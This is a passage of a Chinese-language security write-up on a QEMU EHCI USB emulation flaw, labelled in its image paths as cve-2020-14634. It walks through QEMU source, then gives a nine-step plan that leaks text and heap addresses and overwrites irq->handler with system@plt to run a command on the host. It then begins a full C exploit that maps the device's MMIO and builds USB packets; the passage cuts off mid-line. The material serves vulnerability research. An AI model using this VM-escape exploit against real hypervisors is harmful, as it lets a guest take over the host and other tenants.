state in periodic schedule     */</span></span><br><span class="line">    USBPort ports[NB_PORTS];</span><br><span class="line">    USBPort *companion_ports[NB_PORTS];</span><br><span class="line">    <span class="keyword">uint32_t</span> usbsts_pending;</span><br><span class="line">    <span class="keyword">uint32_t</span> usbsts_frindex;</span><br><span class="line">    EHCIQueueHead aqueues;</span><br><span class="line">    EHCIQueueHead pqueues;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* which address to look at next */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> a_fetch_addr;</span><br><span class="line">    <span class="keyword">uint32_t</span> p_fetch_addr;</span><br><span class="line"></span><br><span class="line">    USBPacket ipacket;</span><br><span class="line">    QEMUSGList isgl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> last_run_ns;</span><br><span class="line">    <span class="keyword">uint32_t</span> async_stepdown;</span><br><span class="line">    <span class="keyword">uint32_t</span> periodic_sched_active;</span><br><span class="line">    <span class="keyword">bool</span> int_req_by_async;</span><br><span class="line">    VMChangeStateEntry *vmstate;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>观察<code>ehci_update_irq</code>，(qemu\hw\usb\hcd-ehci.c)可以发现它调用了EHCIState-&gt;irq结构体中的函数指针，并且参数也在irq结构体中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* update irq line */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">ehci_update_irq</span><span class="params">(EHCIState *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> level = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((s-&gt;usbsts &amp; USBINTR_MASK) &amp; s-&gt;usbintr) &#123;</span><br><span class="line">        level = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    trace_usb_ehci_irq(level, s-&gt;frindex, s-&gt;usbsts, s-&gt;usbintr);</span><br><span class="line">    qemu_set_irq(s-&gt;irq, level);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>qemu_set_irq</code>位置<code>qemu\hw\core\irq.c</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">qemu_set_irq</span><span class="params">(qemu_irq irq, <span class="keyword">int</span> level)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!irq)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    irq-&gt;handler(irq-&gt;opaque, irq-&gt;n, level);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="qemu虚拟地址转成物理地址"><a href="#qemu虚拟地址转成物理地址" class="headerlink" title="qemu虚拟地址转成物理地址"></a>qemu虚拟地址转成物理地址</h3><p>参考链接：<a href="https://xz.aliyun.com/t/6562" target="_blank" rel="noopener">https://xz.aliyun.com/t/6562</a></p>
+<p>首先通过<code>mmio_mem = mmap(0,0x1000,PROT_READ | PROT_WRITE,MAP_SHARED,mmio_fd,0);</code>映射到usb设备的内存。</p>
+<p>接着对这块内存操作可以直接设置opreg的内容。</p>
+<h3 id="整体利用思路"><a href="#整体利用思路" class="headerlink" title="整体利用思路"></a>整体利用思路</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">do_token_setup -&gt; 先发一个正常包设置 s-&gt;setup_state </span><br><span class="line">do_token_setup -&gt; 发一个size为0x5000的包设置 s-&gt;setup_len</span><br><span class="line">do_token_out -&gt; 越界写，控制 s-&gt;setup_index</span><br><span class="line">do_token_out -&gt; 控制 s-&gt;setup_buf 使其能进入do_token_in进行读操作,同时设置 s-&gt;setup_index控制读的位置</span><br><span class="line">do_token_in -&gt; 读操作，泄漏text(text段)、irq(heap段)地址</span><br><span class="line">do_token_setup -&gt; 重新发送一个正常包恢复状态</span><br><span class="line">do_token_setup -&gt; 发一个size为0x5000的包设置 s-&gt;setup_len</span><br><span class="line">do_token_out -&gt; 越界写，控制 s-&gt;setup_index,指向irq-&gt;handler</span><br><span class="line">do_token_out -&gt; 覆盖irq-&gt;handler为system@plt</span><br><span class="line">最后通过mmio读写触发ehci_update_irq-&gt;qemu_set_irq，最终执行system(&apos;xcalc&apos;)，完成利用</span><br></pre></td></tr></table></figure>
+<h3 id="发包"><a href="#发包" class="headerlink" title="发包"></a>发包</h3><p>发送一个基本USBPacket的过程如下，需要构造的部分主要是红框中的部分</p>
+<p>qtd-&gt;token包含了p-&gt;pid和p-&gt;iov.size，而p-&gt;pid决定了USBPacket 进入do_token_setup/in/out</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">以图中为例</span><br><span class="line">2 &lt;&lt; 8 表示进入do_token_setup ,0进入do_token_out, 1进入do_token_in</span><br><span class="line">8 &lt;&lt; 16 表示 p-&gt;iov.size为8</span><br></pre></td></tr></table></figure>
+<p><img src="\images\cve-2020-14634\2.jpg" alt="2"></p>
+<h3 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h3><p>仅需构造正常的packet ，在do_token_setup中设置s-&gt;setup_state = SETUP_STATE_DATA (2)，为后续做准备</p>
+<h3 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h3><p>继续进入do_token_setup，设置s-&gt;setup_len为0x5000,sizeof(s-&gt;data_buf)为0x1000，因此可以越界，且此时s-&gt;setup_state仍为2</p>
+<p><img src="\images\cve-2020-14634\3.jpg" alt="3"></p>
+<h3 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h3><p>由于step1中 s-&gt;setup_buf[0]被设置成了0，因此现在只能进入do_token_out进行写操作，结合USBDevice结构体，data_buf后方可劫持s-&gt;setup_index,并且setup_buf位置data_buf前方</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);</span><br></pre></td></tr></table></figure>
+<p>usb_packet_copy的起始位置是data_buf + s-&gt;setup_index，因此只要将index改为负数 ，下次写入就可以控制 setup_buf，使得可以进入do_token_in进行越界读</p>
+<p><img src="\images\cve-2020-14634\4.jpg" alt="4"></p>
+<h3 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h3><p>控制 s-&gt;setup_buf 使其能进入do_token_in进行读操作,同时设置 s-&gt;setup_index控制读的位置</p>
+<h3 id="step5"><a href="#step5" class="headerlink" title="step5"></a>step5</h3><p>进入do_token_in 读操作，泄漏text(text段)、irq(heap段)地址</p>
+<p><img src="\images\cve-2020-14634\5.jpg" alt="5"></p>
+<h3 id="step6"><a href="#step6" class="headerlink" title="step6"></a>step6</h3><p>因为s-&gt;setup_buf[0]已经为0x80，无法进入do_token_out进入写操作，所以重新发送一个正常包恢复状态</p>
+<h3 id="step7"><a href="#step7" class="headerlink" title="step7"></a>step7</h3><p>发包进入do_token_setup 设置s-&gt;setup_len 为0x5000</p>
+<h3 id="step8"><a href="#step8" class="headerlink" title="step8"></a>step8</h3><p>进入do_token_out越界写控制 s-&gt;setup_index指向irq-&gt;handler为下一步准备</p>
+<h3 id="step9"><a href="#step9" class="headerlink" title="step9"></a>step9</h3><p>进入do_token_out覆盖irq-&gt;handler为system@plt，最后通过mmio读写触发ehci_update_irq-&gt;qemu_set_irq，最终执行system(‘xcalc’)，完成利用</p>
+<p><img src="\images\cve-2020-14634\c3rv6-60n6b.gif" alt="c3rv6-60n6b"></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"><span class="keyword">char</span> *dmabuf;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ohci_hcca</span> *<span class="title">hcca</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EHCIqtd</span> *<span class="title">qtd</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ohci_ed</span> *<span class="title">ed</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ohci_td</span> *<span class="title">td</span>;</span></span><br><span class="line"><span class="keyword">char</span> *setup_buf;</span><br><span class="line"><span class="keyword">uint32_t</span> *dmabuf32;</span><br><span class="line"><span class="keyword">char</span> *td_addr;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EHCIqh</span> *<span class="title">qh</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ohci_td</span> *<span class="title">td_1</span>;</span></span><br><span class="line"><span class="keyword">char</span> *dmabuf_phys_addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">USBDevice</span> <span class="title">USBDevice</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">USBEndpoint</span> <span class="title">USBEndpoint</span>;</span></span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> data_buf;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> irq;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> text;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *ptr;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">USBEndpoint</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> nr;</span><br><span class="line">    <span class="keyword">uint8_t</span> pid;</span><br><span class="line">    <span class="keyword">uint8_t</span> type;</span><br><span class="line">    <span class="keyword">uint8_t</span> ifnum;</span><br><span class="line">    <span class="keyword">int</span> max_packet_size;</span><br><span class="line">    <span class="keyword">int</span> max_streams;</span><br><span class="line">    <span class="keyword">bool</span> pipeline;</span><br><span class="line">    <span class="keyword">bool</span> halted;</span><br><span class="line">    USBDevice *dev;</span><br><span class="line">    USBEndpoint *fd;</span><br><span class="line">    USBEndpoint *bk;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">USBDevice</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int32_t</span> remote_wakeup;</span><br><span class="line">    <span class="keyword">int32_t</span> setup_state;</span><br><span class="line">    <span class="keyword">int32_t</span> setup_len;</span><br><span class="line">    <span class="keyword">int32_t</span> setup_index;</span><br><span class="line"></span><br><span class="line">    USBEndpoint ep_ctl;</span><br><span class="line">    USBEndpoint ep_in[<span class="number">15</span>];</span><br><span class="line">    USBEndpoint ep_out[<span class="number">15</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">EHCIqh</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> next; <span class="comment">/* Standard next link pointer */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* endpoint characteristics */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> epchar;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* endpoint capabilities */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> epcap;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> current_qtd; <span class="comment">/* Standard next link pointer */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> next_qtd;    <span class="comment">/* Standard next link pointer */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> altnext_qtd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> token;     <span class="comment">/* Same as QTD token */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> bufptr[<span class="number">5</span>]; <span class="comment">/* Standard buffer pointer */</span></span><br><span class="line"></span><br><span class="line">&#125; EHCIqh;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">EHCIqtd</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> next;    <span class="comment">/* Standard next link pointer */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> altnext; <span class="comment">/* Standard next link pointer */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> token;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> bufptr[<span class="number">5</span>]; <span class="comment">/* Standard buffer pointer */</span></span><br><span class="line"></span><br><span class="line">&#125; EHCIqtd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">uint64_t</span> virt2phys(<span class="keyword">void</span> *p)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> virt = (<span class="keyword">uint64_t</span>)p;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Assert page alignment</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"open"</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> offset = (virt / <span class="number">0x1000</span>) * <span class="number">8</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> phys;</span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;phys, <span class="number">8</span>) != <span class="number">8</span>)</span><br><span class="line">        die(<span class="string">"read"</span>);</span><br><span class="line">    <span class="comment">// Assert page present</span></span><br><span class="line"></span><br><span class="line">    phys = (phys &amp; ((<span class="number">1U</span>LL &lt;&lt; <span class="number">54</span>) - <span class="number">1</span>)) * <span class="number">0x1000</span> + (virt &amp; <span class="number">0xfff</span>);</span><br><span class="line">    <span class="keyword">return</span> phys;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> mmio_read(<span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint64_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:03.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap mmio_mem failed"</span>);</span><br><span class="line"></span><br><span class="line">    dmabuf = mmap(<span class="number">0</span>, <span class="number">0x3000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (dmabuf == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap"</span>);</span><br><span class="line">    mlock(dmabuf, <span class="number">0x3000</span>);</span><br><span class="line">    dmabuf32 = dmabuf + <span class="number">4</span>;</span><br><span class="line">    qtd = dmabuf + <span class="number">0x200</span>;</span><br><span class="line">    qh = dmabuf + <span class="number">0x100</span>;</span><br><span class="line">    setup_buf = dmabuf + <span class="number">0x300</span>;</span><br><span class="line">    ptr = dmabuf;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_state</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x64</span>, <span class="number">0x100</span>);</span><br><span class="line">    mmio_write(<span class="number">0x64</span>, <span class="number">0x4</span>);</span><br><span class="line">    qh-&gt;epchar = <span class="number">0x00</span>;</span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virt2phys(dmabuf + <span class="number">0x200</span>);</span><br><span class="line">    qtd = dmabuf + <span class="number">0x200</span>;</span><br><span class="line">    qtd-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span> | <span class="number">2</span> &lt;&lt; <span class="number">8</span> | <span class="number">8</span> &lt;&lt; <span class="number">16</span>;</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virt2phys(dmabuf + <span class="number">0x300</span>);</span><br><span class="line">    setup_buf[<span class="number">6</span>] = <span class="number">0xff</span>;</span><br><span class="line">    setup_buf[<span class="number">7</span>] = <span class="number">0x0</span>;</span><br><span class="line">    dmabuf32[<span class="number">0</span>] = virt2phys(dmabuf + <span class="number">0x100</span>) + <span class="number">0x2</span>;</span><br><span class="line">    mmio_write(<span class="number">0x28</span>, <span class="number">0x0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x30</span>, <span class="number">0x0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x2c</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x34</span>, 